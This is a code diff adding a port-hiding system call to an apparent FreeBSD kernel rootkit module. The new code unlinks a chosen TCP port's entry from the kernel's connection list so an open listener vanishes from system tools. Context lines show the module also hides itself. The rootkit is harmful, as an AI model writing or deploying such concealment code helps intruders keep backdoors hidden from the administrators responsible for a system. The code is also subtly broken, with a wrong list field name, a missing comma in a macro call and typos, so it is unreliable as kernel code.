@@ -17,6 +17,44 @@
  */
 #include "net_hiding.h"
 
+/* System call to hide an open local network port. */
+static int hide_port(struct thread *td, void *syscall_args)
+{
+    struct hidden_port_args *uap;
+    uap = (struct hidden_port_args *)syscall_args;
+
+    struct inpcb *inpb;
+
+    INP_INFO_WLOCK(&tcbinfo);
+
+    /* Iteratr through the TCP-based inpcb list */
+    LIST_FOREACH(inpb, tcbinfo.listthread, inp_list) {
+        if (inpb->inp_vflag & INP_TIMEWAIT)
+            continue;
+
+        INP_LOCK(inpb);
+
+        /* Check to see if this is the port we want hidden */
+        if (uap->lport == ntohs(inpb->inp_inc.inc_ie.ie_lport))
+            LIST_REMOVE(inpb inp_list);
+
+        INP_UNLOCK(inpb);
+    }
+
+    INP_INFO_WUNLOCK(&tcbinfo);
+
+    return 0;
+}
+
+/* The system event for the port hiding call */
+static struct sysent hidden_port_sysent = {
+    1,          /* number of arguments */
+    hide_port   /* implementing function */
+};
+
+/* The offset in sysent[] where the system call is to be allocated. */
+static int offset = NO_SYSCALL;
+
 static void hide_module(void)
 {
     struct linker_file *lf;
@@ -101,4 +139,5 @@ static moduledata_t net_hiding_mod = {
     NULL            /* extra data */
 };
 
-DECLARE_MODULE(net_hiding, net_hiding_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
+SYSCALL_MODULE(net_hiding, &offset, &hidden_port_sysent, module_events, NULL);
+//DECLARE_MODULE(net_hiding, net_hiding_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
